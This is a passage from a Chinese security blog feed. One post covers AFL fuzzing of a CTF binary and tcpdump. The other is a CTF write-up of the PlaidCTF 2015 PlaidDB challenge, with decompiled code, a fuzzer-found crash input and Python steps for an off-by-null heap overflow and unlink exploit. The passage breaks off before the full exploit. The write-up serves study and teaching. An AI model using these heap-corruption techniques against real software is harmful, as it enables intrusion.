style="text-align:center"><code>afl-clang++</code>/<code>afl-clang</code></td></tr><tr><td style="text-align:center"><code>afl-cmin</code></td><td style="text-align:center">尝试找到与测试样例全集具有相同覆盖范围的最小子集</td></tr><tr><td style="text-align:center"><code>afl-fuzz</code></td><td style="text-align:center">AFL 进行 Fuzzing 的主程序</td></tr><tr><td style="text-align:center"><code>afl-g++</code>/<code>afl-gcc</code></td><td style="text-align:center">编译生成的文件可以通过设置 <code>LD_LIBRARY_PATH</code> 让程序加载经过 AFL 插桩的 <code>.so</code> 文件；或者可以直接加上 <code>--disable-shared</code> 进行静态编译</td></tr><tr><td style="text-align:center"><code>afl-gotcpu</code></td><td style="text-align:center">用于查看每个核心使用状态</td></tr><tr><td style="text-align:center"><code>afl-plot</code></td><td style="text-align:center">用于绘制各种状态指标的直观变化趋势</td></tr><tr><td style="text-align:center"><code>afl-showmap</code></td><td style="text-align:center">跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组</td></tr><tr><td style="text-align:center"><code>afl-tmin</code></td><td style="text-align:center">减小单个输入样例的大小</td></tr><tr><td style="text-align:center"><code>afl-whatsup</code></td><td style="text-align:center">用于查看每个 fuzzer 的运行状态和总体运行概况，加上 <code>-s</code> 选项只显示概况，其中的数据都是所有 fuzzer 的总和</td></tr></tbody></table><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>本文主要记录怎么用 Fuzzing 对 PWN 题漏洞点寻找。首先可以在当前目录下新建一个文件夹 <code>in</code>，然后使用 tee 来记录下手动输入的一些测试样例：</p><pre><code class="bash">tee in/pattern.txt | ./binary</code></pre><p>接下来可以直接使用 <code>afl-fuzz</code> 对程序 Fuzzing。其中 <code>-i</code> 指定输入目录，<code>-o</code> 指定输出目录，<code>-Q</code> 表示使用 QEMU 模式：</p><pre><code class="bash">afl-fuzz -i in -o out -Q -- ./binary</code></pre><p>运行的时候可能会报错：</p><pre><code class="bash">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 1 CPU core and 1 runnable tasks (utilization: 100%).[*] Checking core_pattern...[-] Hmm, your system is configured to send core dump notifications to an    external utility. This will cause issues: there will be an extended delay    between stumbling upon a crash and having this information relayed to the    fuzzer via the standard waitpid() API.    To avoid having crashes misinterpreted as timeouts, please log in as root    and temporarily modify /proc/sys/kernel/core_pattern, like so:    echo core &gt;/proc/sys/kernel/core_pattern[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;         Location : check_crash_handling(), afl-fuzz.c:7275</code></pre><p>在执行 <code>afl-fuzz</code> 前，如果系统配置为将核心转储文件（core）通知发送到外部程序，将导致将崩溃信息发送到 Fuzzer 之间的延迟增大，进而可能将崩溃被误报为超时，所以得临时修改 core_pattern 文件：</p><pre><code class="bash">echo core | sudo tee /proc/sys/kernel/core_pattern</code></pre><p>接下来就可以开始 Fuzz：</p><p><img src="/pics/Fuzzing-to-Exploit/2.png" srcset="/img/loading.gif" alt></p><p>状态窗口中“cycles done”字段颜色的颜色可以作为何时停止测试的参考。随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续 Fuzzing 下去也很难有新的发现了，这时便可以通过 Ctrl-C 停止 <code>afl-fuzz</code>。在输出的 <code>out</code> 文件夹下的 <code>crashes</code>，可以看到测试得到使程序 crash 的几个样例：</p><pre><code class="bash">➜  crashes lsid:000000,sig:06,src:000000,op:havoc,rep:2  id:000001,sig:06,src:000000,op:havoc,rep:4  id:000002,sig:06,src:000000,op:havoc,rep:2  README.txt</code></pre><p>使用 <code>afl-tmin</code> 可以获得最小的测试样例：</p><pre><code class="bash">afl-tmin -i out/crashes/xxx -o min -Q -- ./binary</code></pre><h1 id="Plaid-CTF-2015-PlaidDB"><a href="#Plaid-CTF-2015-PlaidDB" class="headerlink" title="Plaid-CTF-2015-PlaidDB"></a>Plaid-CTF-2015-PlaidDB</h1><p>以之前的一道题目为例。使用 <code>afl-fuzz</code> 对程序进行测试，跑了一段时间后可以得到几个使 crash 的结果：</p><pre><code>➜  crashes xxd id:000000,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a41  T.NNNNNN.0.GET.A0000020: 415a 4141 4141 4141 4141 4141 4141 4141  AZAAAAAAAAAAAAAA0000030: 4141 4141 4155 540a 410a                 AAAAAUT.A.➜  crashes xxd id:000001,sig:06,src:000000,op:havoc,rep:40000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a58  T.NNNNNN.0.GET.X0000020: 4141 ae41 4141 4141 4141 4141 4141 4141  AA.AAAAAAAAAAAAA0000030: 4141 4139 4155 540a 410a                 AAA9AUT.A.➜  crashes xxd id:000002,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 5554 0a4e 0a30 0a47 4554 0a41  T.NNUT.N.0.GET.A0000020: 4141 410a 4e0a 300a 4745 540a 4141 4141  AAA.N.0.GET.AAAA0000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA0000040: 4141 4141 0a                             AAAA.</code></pre><p>然后用 <code>afl-tmin</code> 来将样例最小化：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB xxd min0000000: 5055 540a 0a0a 5055 540a 0a0a 4745 540a  PUT...PUT...GET.0000010: 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000020: 3030 3030 3030 3030 0a                   00000000.</code></pre><p>然后输入样例可以看到程序会 crash。发现程序在 free 的时候发现下一个 chunk 的 size 不合法，再经过一定的调试就可以定位到 Off-by-Null：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB cat min | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Update successful.PROMPT: Enter command:PROMPT: Enter row key:ERROR: Row not found.*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x000055f7ab2a20f0 ***[1]    21002 done       cat min |       21003 abort      ./datastore</code></pre><h1 id="tcpdump-4-9-0（CVE-2017-13044-amp-CVE-2017-12989）"><a href="#tcpdump-4-9-0（CVE-2017-13044-amp-CVE-2017-12989）" class="headerlink" title="tcpdump-4.9.0（CVE-2017-13044 &amp; CVE-2017-12989）"></a>tcpdump-4.9.0（CVE-2017-13044 &amp; CVE-2017-12989）</h1><p>这里再对 64 位的 tcpdump-4.9.0 进行了测试。在安装 tcpdump 之前要先安装 libpcap：</p><pre><code class="bash">wget http://www.tcpdump.org/release/libpcap-1.8.1.tar.gztar -zxvf libpcap-1.8.1.tar.gz &amp;&amp; cd libpcap-1.8.1./configuremakesudo make install</code></pre><p>然后使用用 <code>afl-gcc</code> 和 <code>afl-g++</code> 对 tcpdump 进行编译：</p><pre><code class="bash">wget http://www.tcpdump.org/release/tcpdump-4.9.0.tar.gztar -zxvf tcpdump-4.9.0.tar.gz &amp;&amp; cd tcpdump-4.9.0CC=afl-gcc CXX=afl-g++ ./configuremakesudo make install</code></pre><p>安装完后查看以下版本：</p><pre><code class="bash">$ tcpdump --versiontcpdump version 4.9.0libpcap version 1.8.1</code></pre><p>然后从 <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">Wireshark 官网</a>上下载一些流量包，作为测试的样例，并使用 editcap 将每个流量包分成四份：</p><pre><code class="bash">$ for i in `ls` ; do editcap -c 4 $i Trimmed/trimm.pcap ; done$ ls Trimmed/ | wc -l32170</code></pre><p>然后用 <code>alf-cmin</code> 把测试样例再缩小。需要从文件中获取输入的话，可以使用“@@”代替被测试程序命令行中输入文件名的位置：</p><pre><code class="bash">$ afl-cmin -i Trimmed/ -o Pcap-corpus/ -- tcpdump -ee -vv -nnr @@corpus minimization tool for afl-fuzz by &lt;lcamtuf@google.com&gt;[*] Testing the target binary...[+] OK, 377 tuples recorded.[*] Obtaining traces for input files in &#39;Trimmed/&#39;...    Processing file 32170/32170...[*] Sorting trace sets (this may take a while)...[+] Found 13843 unique tuples across 32170 files.[*] Finding best candidates for each tuple...    Processing file 32170/32170...[*] Sorting candidate list (be patient)...[*] Processing candidates and writing output files...    Processing tuple 13843/13843...[+] Narrowed down to 380 files, saved in &#39;Pcap-corpus/&#39;.</code></pre><p>最后使用 <code>afl-fuzz</code> 对程序测试，可以使用 <code>screen</code> 把程序放在后台运行：</p><pre><code class="bash">$ screen afl-fuzz -i PCAPS/Pcap-corpus/ -o out -- tcpdump -ee -vv -nnr @@</code></pre><p>TODO:</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="https://cool-y.github.io/2019/07/09/afl-first-try/" target="_blank" rel="noopener">https://cool-y.github.io/2019/07/09/afl-first-try/</a><br><a href="https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ</a><br><a href="https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg</a><br><a href="https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498" target="_blank" rel="noopener">https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498</a><br><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/</a><br><a href="https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/</a><br><a href="https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/</a><br><a href="https://blog.csdn.net/hejunqing14/article/details/50338161" target="_blank" rel="noopener">https://blog.csdn.net/hejunqing14/article/details/50338161</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AFL Fuzz 初体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="fuzz" scheme="blog.b3ale.cn/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2015-PlaidCTF-PlaidDB</title>
    <link href="blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/"/>
    <id>blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/</id>
    <published>2020-04-12T08:11:29.000Z</published>
    <updated>2020-04-16T02:23:59.380Z</updated>
    
    <content type="html"><![CDATA[<p>之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。</p><a id="more"></a><h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>程序保护全开：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB checksec ./datastore[*] &#39;/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled</code></pre><p>尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（<code>&quot;\n&quot;</code>）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTPROMPT: Enter row key:AAAPROMPT: Enter data size:4PROMPT: Enter data:AAAAINFO: Insert successful.PROMPT: Enter command:ERROR: &#39;&#39; is not a valid command.PROMPT: Enter command:GETPROMPT: Enter row key:AAAINFO: Row data [4 bytes]:AAAAPROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesINFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:DELPROMPT: Enter row key:th3fl4gINFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesPROMPT: Enter command:EXITINFO: Goodbye</code></pre><p>先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：</p><pre><code class="cpp">struct Node {    char *key;    long data_size;    char *data;    struct Node *left;    struct Node *right;    long dummy;    long dummy1;}</code></pre><p>其中 get 函数一开始获取输入的列名（这里我已经标出了 <code>vulread()</code>，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：</p><pre><code class="cpp">void get(){  char *key; // rbp  struct Node *node; // rbx  int cmp_result; // eax  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( node )  {    while ( 1 )    {      cmp_result = strcmp(key, node-&gt;key);      if ( cmp_result &lt; 0 )      {        node = node-&gt;left;        goto LABEL_2;      }      if ( !cmp_result )        break;      node = node-&gt;right;      if ( !node )        goto LABEL_6;    }    __printf_chk(1LL, &quot;INFO: Row data [%zd byte%s]:\n&quot;, node-&gt;data_size);    fwrite(node-&gt;data, 1uLL, node-&gt;data_size, stdout);    free(key);  }  else  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    free(key);  }}</code></pre><p>在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：</p><pre><code class="cpp">void put(){  void **chunk; // rbx  unsigned __int64 size; // rax  void *buf; // rax  struct Node *v3; // rbp  char size_1[24]; // [rsp+0h] [rbp-38h]  unsigned __int64 canary; // [rsp+18h] [rbp-20h]  canary = __readfsqword(0x28u);  chunk = (void **)malloc(0x38uLL);  if ( !chunk )    goto LABEL_10;  puts(&quot;PROMPT: Enter row key:&quot;);  *chunk = vulread();  puts(&quot;PROMPT: Enter data size:&quot;);  saferead(size_1, 16LL);  size = strtoul(size_1, 0LL, 0);  chunk[1] = (void *)size;  buf = malloc(size);  chunk[2] = buf;  if ( !buf )  {    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);    free(*chunk);    if ( __readfsqword(0x28u) == canary )    {      free(chunk);      return;    }LABEL_10:    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);    exit(-1);  }  puts(&quot;PROMPT: Enter data:&quot;);  readn(chunk[2], (size_t)chunk[1]);  v3 = (struct Node *)insert_node(chunk);  if ( v3 )  {    free(*chunk);    free(v3-&gt;data);    v3-&gt;data_size = (__int64)chunk[1];    v3-&gt;data = (char *)chunk[2];    free(chunk);    puts(&quot;INFO: Update successful.&quot;);  }  else  {    puts(&quot;INFO: Insert successful.&quot;);  }  if ( __readfsqword(0x28u) != canary )    goto LABEL_10;}</code></pre><p>dump 函数后序遍历红黑树并输出列名和数据长度：</p><pre><code class="cpp">struct Node *dump(){  struct Node *result; // rax  struct Node *node; // rbx  struct Node *n; // rax  puts(&quot;INFO: Dumping all rows.&quot;);  result = (struct Node *)&amp;root;  node = root;  if ( !root )    return result;  while ( node-&gt;left )    node = node-&gt;left;  while ( 1 )  {    while ( 1 )    {      node-&gt;data_size;      __printf_chk(1LL, &quot;INFO: Row [%s], %zd byte%s\n&quot;, node-&gt;key);      n = node-&gt;right;      if ( !n )        break;      do      {        node = n;        n = n-&gt;left;      }      while ( n );    }    result = node-&gt;dummy;    if ( !result || node != result-&gt;left )      break;LABEL_15:    node = result;  }  while ( result )  {    if ( node != result-&gt;right )      goto LABEL_15;    node = result;    result = result-&gt;dummy;  }  return result;}</code></pre><p>最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：</p><pre><code class="cpp">int del(){  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( !node )  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    return;  }  while ( 1 )  {    key_1 = node-&gt;key;  ...LABEL_69:  LODWORD(n-&gt;dummy1) = 0;LABEL_29:  free(key_1);  free(node-&gt;data);  free(node);  free(key);  return puts(&quot;INFO: Delete successful.&quot;);}</code></pre><p>最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 <code>&quot;\x00&quot;</code>：</p><pre><code class="cpp">char *vulread(){  char *buf; // r12  char *end; // rbx  size_t cap; // r14  char c; // al  char c_1; // bp  signed __int64 idx; // r13  char *new_buf; // rax  buf = (char *)malloc(8uLL);  end = buf;  cap = malloc_usable_size(buf);                // 24  while ( 1 )  {    c = _IO_getc(stdin);    c_1 = c;    if ( c == -1 )      goodbye();    if ( c == &#39;\n&#39; )      break;    idx = end - buf;    if ( cap &lt;= end - buf )    {      new_buf = (char *)realloc(buf, 2 * cap);      buf = new_buf;      if ( !new_buf )      {        puts(&quot;FATAL: Out of memory&quot;);        exit(-1);      }      end = &amp;new_buf[idx];      cap = malloc_usable_size(new_buf);        // 48    }    *end++ = c_1;  }  *end = 0;                                   // off by one  return buf;}</code></pre><p>再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x564b295ad010datastore-&gt;malloc(8)                                                    = 0x564b295ad050datastore-&gt;malloc(9)                                                    = 0x564b295ad070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x564b295ad090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad0d0APROMPT: Enter data size:0datastore-&gt;malloc(0)                                                    = 0x564b295ad0f0PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:DELPROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad110Adatastore-&gt;free(0x564b295ad0d0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad0f0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad090)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad110)                                         = &lt;void&gt;INFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>根据上面的分析，有用的信息大概如下几个：</p><ol><li>每个节点固定大小（<code>malloc(56)</code>）；</li><li><code>vulread()</code> 函数中有 <code>malloc()</code> 和 <code>realloc()</code>，可以用 <code>realloc()</code> 获取特定大小的 chunk；</li><li><code>vulread()</code> 里存在 Off by Null；</li><li>删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；</li><li>往节点中读入数据时的大小可控（<code>malloc(size)</code>）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：</li></ol><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x55feff2f2010datastore-&gt;malloc(8)                                                    = 0x55feff2f2050datastore-&gt;malloc(9)                                                    = 0x55feff2f2070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f20d0APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f20f0PROMPT: Enter data:AINFO: Insert successful.PROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2110PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f2150APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f2170PROMPT: Enter data:Bdatastore-&gt;free(0x55feff2f2150)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f20f0)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f2110)                                         = &lt;void&gt;INFO: Update successful.PROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><p>看过一遍后，漏洞点其实就在 <code>vulread()</code> 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 <code>&quot;\x00&quot;</code>，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：</p><pre><code>PUTA0DELAPUTNNNNNN0PUTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>可以看到在 free 的时候提示了 <code>&quot;free(): invalid next size (fast)&quot;</code>，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：</p><pre><code>➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:INFO: Delete successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:GETPROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:GETPROMPT: Enter row key:AAAAAAAAAAAAAAAAAAAAAAAAERROR: Row not found.cat: -: Resource temporarily unavailable*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x00005555557580d0 ***</code></pre><p>这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 <strong>size 变小</strong>（shrink），同时也把 <strong>prev_inuse 置为 0</strong>；同时可以<strong>设置下一个 chunk 的 prev_size</strong>，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：</p><pre><code>                                    prev                            prev             size                   size     size                   size     size +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+ |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   | +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+   prev   size     size +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+ |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    | +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+</code></pre><p>实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：</p><pre><code class="python"># Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)</code></pre><p>结果大概如下，列 <code>&#39;1&#39;</code> 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x360 - 0x10 |    0x40    | node &#39;1&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | &#39;1&#39; =&gt; [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+</code></pre><p>接下来 PUT 列 <code>&#39;2&#39;</code> 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：</p><pre><code class="python">PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin</code></pre><p>堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;2&#39; -&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x360 - 0x10 |    0x40    | node &#39;2&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+ 0x4c0 - 0x10 |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 +------------+</code></pre><p>然后接下来触发 Off-by-Null，并且：</p><pre><code class="python">DEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752DEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink</code></pre><p>smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：</p><pre><code> +------------+ 0x0f0 - 0x10                                    +------------+ |    0x40    | node &#39;3&#39;                                        |    0x40    | +------------+ 0x130 - 0x10                                    +------------+ |    0x20    | &#39;3&#39;                                             |    0x20    | +------------+ 0x150 - 0x10                                    +------------+ |    0x20    | &#39;&#39;                                              |    0x20    | +------------+ 0x170 - 0x10                                    +------------+ |    0x40    | node &#39;0&#39; =&gt; [freed]                             |    0x40    | +------------+ 0x1b0 - 0x10                                    +------------+ |    0x20    | &#39;0&#39; =&gt; [freed]                                  |    0x20    | +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+ |    0x90    | &#39;C&#39; * 0x80 =&gt; [freed]                           |   0x3f0    | +------------+ 0x260 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;1&#39; =&gt; [freed]                             |     ::     | +------------+ 0x2a0 - 0x10                                    +---- :: ----+ |    0x20    | &#39;1&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x2c0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x2e0 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;2&#39; =&gt; [freed]                             |     ::     | +------------+ 0x320 - 0x10                                    +---- :: ----+ |    0x20    | &#39;2&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x340 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x360 - 0x10                                    +---- :: ----+ |    0x40    | [freed]                                         |     ::     | +------------+ 0x3a0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x3c0 